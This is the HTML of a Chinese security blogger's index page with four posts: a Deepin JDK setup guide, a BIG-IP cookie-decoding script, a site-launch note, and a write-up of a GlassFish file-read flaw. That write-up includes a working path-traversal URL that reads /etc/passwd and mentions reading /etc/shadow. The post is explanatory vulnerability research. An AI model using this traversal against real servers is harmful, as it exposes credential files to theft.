<!DOCTYPE HTML>
<!--[if lt IE 9]>
<html id="ie8" lang="zh-CN">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="zh-CN">
<!--<![endif]-->
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="google-site-verification" content="ScmDBVL4m8_1FCWi0q1GowKId0hYzo3t10pCTkxiMwg" />
    <title>紫诺's BL0G</title>

    <!--[if lt IE 9]>
    <script src="http://www.idbg.net/admin/js/html5shiv.js"></script>
    <script src="http://www.idbg.net/admin/js/respond.js"></script>
    <![endif]-->

    
    <link rel="stylesheet" href="http://www.idbg.net/usr/themes/BootMantic/css/form.css">
    <link rel="stylesheet" href="http://www.idbg.net/usr/themes/BootMantic/css/label.css">    
    <link rel="stylesheet" href="http://www.idbg.net/usr/themes/BootMantic/css/zocial.css">

    <link rel="stylesheet" href="http://www.idbg.net/usr/themes/BootMantic/css/global.css">
    <link rel="stylesheet" href="http://www.idbg.net/usr/themes/BootMantic/css/header.css">
    <link rel="stylesheet" href="http://www.idbg.net/usr/themes/BootMantic/css/content.css">
    <link rel="stylesheet" href="http://www.idbg.net/usr/themes/BootMantic/css/comments.css">

    <link rel="stylesheet" href="http://www.idbg.net/usr/themes/BootMantic/css/style.css">
    <link rel="stylesheet" href="http://www.idbg.net/usr/themes/BootMantic/css/base.css">

    <meta name="description" content="我的灵魂在散步，脚尖却迷了路~" />
<meta name="keywords" content="security?,hack?,No!" />
<meta name="generator" content="Typecho 1.0/14.10.10" />
<meta name="template" content="BootMantic" />
<link rel="pingback" href="http://www.idbg.net/action/xmlrpc" />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.idbg.net/action/xmlrpc?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.idbg.net/action/xmlrpc?wlw" />
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://www.idbg.net/feed/" />
<link rel="alternate" type="application/rdf+xml" title="RSS 1.0" href="http://www.idbg.net/feed/rss/" />
<link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="http://www.idbg.net/feed/atom/" />
<link href="http://www.idbg.net/usr/plugins/Prismjs/themes/prism-okaidia.css" rel="stylesheet" /></head>

<body>
  
<div id="back-to-top" class="red" data-scroll="body">
    <svg id="rocket" version="1.1" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 64 64">
        <path fill="#CCCCCC" d="M42.057,37.732c0,0,4.139-25.58-9.78-36.207c-0.307-0.233-0.573-0.322-0.802-0.329
        c-0.227,0.002-0.493,0.083-0.796,0.311c-13.676,10.31-8.95,35.992-8.95,35.992c-10.18,8-7.703,9.151-1.894,23.262
        c1.108,2.693,3.048,2.06,3.926,0.115c0.877-1.943,2.815-6.232,2.815-6.232l11.029,0.128c0,0,2.035,4.334,2.959,6.298
        c0.922,1.965,2.877,2.644,3.924-0.024C49.974,47.064,52.423,45.969,42.057,37.732z M31.726,23.155
        c-2.546-0.03-4.633-2.118-4.664-4.665c-0.029-2.547,2.012-4.587,4.559-4.558c2.546,0.029,4.634,2.117,4.663,4.664
        C36.314,21.143,34.272,23.184,31.726,23.155z"></path>
    </svg>
</div>

<div class="navbar">
    <div class="container">
        <ul class="nav">
            <li><a class="active" href="http://www.idbg.net/">紫诺's BL0G</a></li>
                                    <li><a href="http://www.idbg.net/board.html" title="留言板">留言板</a></li>
                        <li><a href="http://www.idbg.net/tools.html" title="工具箱">工具箱</a></li>
                    </ul>
        <div class="nav-right">
                        <form class="search-form" method="post" action="./">
                <input type="text" name="s" class="search-input" placeholder="站内搜索" />
            </form>
                    </div>
    </div>
</div>
  
<div class="container" id="content">
    <div id="information" class="info">
                <a href="http://www.idbg.net/"><img class="avatar" src="http://www.idbg.net/usr/themes/BootMantic/images/head.png" /></a>
                <p class="description">我的灵魂在散步，脚尖却迷了路~</p>
    </div>
    <div class="article-list">

<div class="main">
        <article class="block post">
        <span class="round-date red">
            <span class="month">11月</span>
            <span class="day">15</span>
        </span>
        <p class="title"><a href="http://www.idbg.net/article/16.html" target="_blank">Deepin Linux 安装JDK</a></p>
        <div class="ui ribbon label red"><a href="http://www.idbg.net/category/Linux.html">Linux</a></div>
            <div class="article-content red">
                <p><strong>linux version：deepin-15.3-amd64</strong><br><strong>java version ：1.8.0_102</strong></p><pre><code class="lang-bash">uname -a
Linux GiX 4.4.0-3-deepin-amd64 #1 SMP Deepin 4.4.30-1 (2016-11-01) x86_64 GNU/Linux</code></pre><p>步骤：<br>1、下载JDK：<br><a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html"><a href="http://www.oracle.com/technetwork/java/javase/downloads/index.html">http://www.oracle.com/technetwork/java/javase/downloads/index.html</a></a></p><p>2、解压JDK文件到文件系统，比如我的/home/gix/Software/jdk</p><p>3、sudo vim /etc/profile</p><p>在最后面加上</p><pre><code class="language-unknown">exprot JAVA_HOME=&quot;/home/gix/Software/jdk&quot;
exprot CLASSPATH=.:$JAVA_HOME/lib:$JAVA_HOME/jre/lib
export PATH=$JAVA_HOME/bin:$PATH</code></pre><p>然后保存退出，执行source /etc/profile</p><p>4、执行java -version，看看有没有版本信息输出</p><p>Ps：建议删除自带的OpenJdk，有用除外</p>            </div>
        </article>
        <article class="block post">
        <span class="round-date red">
            <span class="month">01月</span>
            <span class="day">15</span>
        </span>
        <p class="title"><a href="http://www.idbg.net/article/8.html" target="_blank">应用服务器GlassFish任意文件读取漏洞（其实还可以列目录）</a></p>
        <div class="ui ribbon label red"><a href="http://www.idbg.net/category/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6.html">漏洞研究</a></div>
            <div class="article-content red">
                <h3>事件源于wooyun的一个漏洞</h3><p><a href="http://www.wooyun.org/bugs/wooyun-2010-0144595"><a href="http://www.wooyun.org/bugs/wooyun-2010-0144595">http://www.wooyun.org/bugs/wooyun-2010-0144595</a></a></p><p>完完全全的0day（其实是工具扫出来的，让官方哭会吧）</p><p>exp么就是：</p><p><code class="language-unknown">http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code></p><h3>原理</h3><p>是因为java把"%c0%ae"解析为"\uC0AE"，最后转义为ASCCII字符"."</p><h3>看看威力</h3><p>首先列目录</p><p><img src="http://www.idbg.net/usr/uploads/2016/01/1646803613.png" alt="2016_01_15_21_44_22.png" title="2016_01_15_21_44_22.png"></p><p>读取passwd</p><p><img src="http://www.idbg.net/usr/uploads/2016/01/1383652452.png" alt="2016_01_15_21_44_41.png" title="2016_01_15_21_44_41.png"></p><p>读取shadow</p><p><img src="http://www.idbg.net/usr/uploads/2016/01/509733355.png" alt="2016_01_15_21_44_55.png" title="2016_01_15_21_44_55.png"></p>            </div>
        </article>
        <article class="block post">
        <span class="round-date red">
            <span class="month">12月</span>
            <span class="day">20</span>
        </span>
        <p class="title"><a href="http://www.idbg.net/article/3.html" target="_blank">BIGIP Cookie Decode</a></p>
        <div class="ui ribbon label red"><a href="http://www.idbg.net/category/Coding.html">写点代码</a></div>
            <div class="article-content red">
                <p>BIGIP F5负载均衡设备，会向cookie里面写实际请求服务器的地址，但是是编码的<br>具体的实现方式可以看这里：<a href="http://greenoperator.tumblr.com/post/10238639864/bigip-cookie-decode-encode-steps">http://greenoperator.tumblr.com/post/10238639864/bigip-cookie-decode-encode-steps</a></p><p>我写了个python小脚本来decode：<br>使用方法，python file.py cookie，因为某些函数，在python3的用法不大一样，故需使用python2</p><pre><code class="lang-python">import sys, re
print(&quot;.&quot;.join(map(lambda x: str(int(x, 16)), re.findall(r'(.{2})', map(lambda x: x[2:], map(hex, map(int, sys.argv[1].split(&quot;.&quot;)[0:2])))[0])[::-1]))+&quot;:&quot;+str(int(&quot;&quot;.join(re.findall(r'([0-9a-f]{2})', map(lambda x: x[2:], map(hex, map(int, sys.argv[1].split(&quot;.&quot;)[0:2])))[1].zfill(4))[::-1]), 16)))</code></pre><p>网上有人写的powershell的decode脚本：</p><pre><code class="lang-powershell"># Decode-BigIPCookie.ps1
# usage:
# Decode-BigIPCookie &quot;375537930.544.0000&quot;
 
function Decode-Cookie { 
 param ([string] $ByteArrayCookie)
 
 ### F5 itself for the formula: http://support.f5.com/kb/en-us/solutions/public/6000/900/sol6917.html
 ### $poolcookie=&quot;375537930.544.0000&quot;
 ###
 
 if ($ByteArrayCookie -match '^(\d+)\.(\d+)\.0000$') {
   $ipEncoded   = [int64] $matches[1]
   $portEncoded = [int64] $matches[2]
 
   #  convert ipEnc to Hexadecimal
   $ipEncodedHex = &quot;{0:X8}&quot; -f $ipEncoded
   #  then split into an array of four 
   $ByteArray=@()
   $ipEncodedHex -split '([a-f0-9]{2})' | foreach {if ($_) {$ByteArray += $_.PadLeft(2,&quot;0&quot;)}}
   #  now reverse the array (the byte order)
   $ReversedBytes = -join ($ByteArray[$($ByteArray.Length-1)..0])
   #  and convert each 1-byte hex back to decimal
   $ByteArray=@()
   $ReversedBytes -split '([a-f0-9]{2})' | foreach {if ($_) {$ByteArray += $_.PadLeft(2,&quot;0&quot;)}}
   # seperated by &quot;.&quot;'s.
   $IPstring=&quot;&quot;
   $ByteArray | foreach { $IPstring += &quot;$([convert]::ToByte($_,16)).&quot; }
   $IP = $IPstring.trimend(&quot;.&quot;)
 
   # convert $portEncoded to Hexadecimal
   $portEncodedHex = &quot;{0:X4}&quot; -f $portEncoded
   # reverse the order of the 2 bytes
   $ByteArray=@()
   $portEncodedHex -split '([a-f0-9]{2})' | foreach {if ($_) {$ByteArray += $_.PadLeft(2,&quot;0&quot;)}}
 
   $ReversedBytes = -join ($ByteArray[$($ByteArray.Length-1)..0])
   # and convert to decimal
   $PORT=[convert]::ToUint64($ReversedBytes,16)
 
   write-output &quot;$IP : $PORT&quot;
 }
 else {
   write-output &quot;cookie string format is invalid.&quot;
   write-output &quot;usage:&quot;
   write-output &quot;  .\Decode-BigIPCookie '375537930.544.0000' &quot;
 }
}
 
if ($args.count -gt 0) {
  Decode-Cookie $args
}
else {
  write-output &quot; usage:&quot;
  write-output &quot;  Decode-BigIPCookie '375537930.544.0000' &quot;
}</code></pre>            </div>
        </article>
        <article class="block post">
        <span class="round-date red">
            <span class="month">12月</span>
            <span class="day">19</span>
        </span>
        <p class="title"><a href="http://www.idbg.net/article/1.html" target="_blank">全新的站点</a></p>
        <div class="ui ribbon label red"><a href="http://www.idbg.net/category/default.html">默认分类</a></div>
            <div class="article-content red">
                <p>有很久很久没有写过文章了，导致原来的博客站也荒废了。</p><p>以前的博客写了很多关于CTF题目的writeup，现在想想也没必要留着了，就直接丢弃了吧。</p><p>也从wordpress转到了typecho。</p><p>简单点好点。</p><p>原来西普学院（现实验吧）的部分writeup下载地址：</p><p><a href="http://pan.baidu.com/s/1c0MFyow"><a href="http://pan.baidu.com/s/1c0MFyow">http://pan.baidu.com/s/1c0MFyow</a></a></p>            </div>
        </article>
        </div>

<div class="side">
    
         
        <section class="block">
        <p class="ui red ribbon label">最新文章</p>
        <div class="list">
            <a href="http://www.idbg.net/article/16.html" class="item" target="_blank">Deepin Linux 安装JDK</a><a href="http://www.idbg.net/article/8.html" class="item" target="_blank">应用服务器GlassFish任意文件读取漏洞（其实还可以列目录）</a><a href="http://www.idbg.net/article/3.html" class="item" target="_blank">BIGIP Cookie Decode</a><a href="http://www.idbg.net/article/1.html" class="item" target="_blank">全新的站点</a>        </div>
    </section>
    
        <section class="block">
        <p class="ui red ribbon label">最近回复</p>
        <div class="list">
		<!-- 多说最新评论 start -->
	<div class="ds-recent-comments" data-num-items="5" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="70"></div>
<!-- 多说最新评论 end -->
<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"gix"};
	(function() {
		var ds = document.createElement('script');
		ds.type = 'text/javascript';ds.async = true;
		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
		ds.charset = 'UTF-8';
		(document.getElementsByTagName('head')[0] 
		 || document.getElementsByTagName('body')[0]).appendChild(ds);
	})();
	</script>
<!-- 多说公共JS代码 end -->
        </div>
    </section>
    
        <section class="block friend-list">
        <p class="ui red ribbon label">友情链接</p>
        <div class="animated list friend">
            <a class="item" href="http://fuzzzz.net/" title="" target="_blank"><img class="avatar image" src="http://www.idbg.net/usr/plugins/Links/nopic.jpg" alt="SudoHac's BLoG" /><div class="content"><p class="header">SudoHac's BLoG</p><p></p></div></a>
        </div>
    </section>
    
    
        <section class="block">
        <p class="ui red ribbon label">其它</p>
        <div class="animated list">
                        <a class="item" href="http://www.idbg.net/admin/login.php">登录</a>
                        <a class="item" href="http://www.idbg.net/feed/" target="_blank">文章 RSS</a>
            <a class="item" href="http://www.idbg.net/feed/comments/" target="_blank">评论 RSS</a>
            <a class="item" href="http://www.typecho.org" target="_blank">Typecho</a>
        </div>
    </section>
    </div>
    </div>
</div>
<div id="footer">
	<!-- copyright -->
	<div class="container">
		<div class="row remove-bottom">				
			<div class="col-8 columns1">
			<h3>Little About</h3>
			<p>苦逼的安全从业人员<br>
E-mail：idbg.net@gmail.com </p>
			</div>

			<div class="col-8 columns2">

				<h3 class="mobile-hide">Follow me</h3>
        <div id="social-links">
          <a href="#" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
          <a href="#" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
          <a href="#" class="google" target="_blank" title="墙外的世界">google+</a>
          <a href="#" class="github" target="_blank" title="开源精彩">github</a>
          <a href="mailto:idbg.net@gmail.com" class="mail" target="_blank" title="私信给我">私信给我</a>
          <a href="http://www.idbg.net/feed" class="rss" title="RSS订阅">RSS订阅</a>
        </div>						
			</div>
			
	</div>
	
	<!-- /copyright -->
</div>
<div class="container">
			        <div class="bot-line"></div>
				<p class="Copyright">
	Copyright &copy;2016 <a href="http://www.idbg.net">紫诺</a> </p></div>
		</div>
<script>var pres = document.getElementsByTagName('pre');
                for (var i = 0; i < pres.length; i++)
                    if (pres[i].getElementsByTagName('code').length > 0)
                        pres[i].className  = 'line-numbers';
                </script><script src="http://www.idbg.net/usr/plugins/Prismjs/prism.js"></script></body>

</html>
